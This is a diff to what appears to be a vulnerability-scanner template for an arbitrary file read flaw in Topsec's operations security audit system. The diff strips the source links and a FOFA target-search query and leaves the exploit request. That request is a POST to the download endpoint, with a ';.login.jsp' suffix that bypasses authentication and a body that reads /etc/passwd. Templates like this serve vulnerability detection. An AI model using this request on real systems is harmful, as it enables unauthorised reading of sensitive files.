@@ -3,12 +3,8 @@ info:
   name: 天融信运维安全审计系统download接口任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gcvaqa1keb8ql8z6'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gcvaqa1keb8ql8z6
-    fofa: header="iam" && server="Apache-Coyote/"
 http:
 - raw:
   - 'POST /iam/download;.login.jsp HTTP/1.1
@@ -50,10 +46,7 @@ http:
     Content-Length: 38
 
 
-    filename=test.txt&filepath=/etc/passwd
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730351502246-805629c7-33bb-4b59-ab59-313ad25b8614.png)'
+    filename=test.txt&filepath=/etc/passwd'
   redirects: false
   matchers:
   - status:
